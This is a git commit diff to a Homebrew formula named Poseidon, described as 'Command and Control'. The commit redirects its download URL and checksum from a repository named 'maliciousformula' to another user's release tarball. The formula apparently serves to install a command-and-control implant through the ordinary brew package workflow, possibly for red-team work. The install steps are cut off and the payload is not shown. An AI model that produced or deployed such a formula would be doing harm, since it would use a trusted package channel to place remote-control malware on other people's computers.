f3bc79f62f95cbe12a10da74ec8328d9e789d65b
kvcallfield <52758926+kvcallfield@users.noreply.github.com>
2025-05-23 14:52:28 -0500

    Add files via upload

--- Formula/poseidon.rb
+++ Formula/poseidon.rb
@@ -1,8 +1,8 @@
 class Poseidon < Formula
     desc "Command and Control"
-    homepage "https://github.com/werdhaihai/"
-    url "https://github.com/werdhaihai/maliciousformula/releases/download/v1.33.7/poseidon-1.33.7.tar.gz"
-    sha256 "2f05bc2d20908c6d3d4cbe13c98e7cd87e07afc474d68dee5f58b2c872d71bad"
+    homepage "https://github.com/kvcallfield/"
+    url "https://github.com/kvcallfield/homebrew-brew/releases/download/v1.33.7/poseidon-1.33.7.tar.gz"
+    sha256 "a57abacdb3915450ec70c83d5efc717efbcbed80f350dadeaaf38bcd04d7b2e2"
     version "1.33.7"
 
     def install
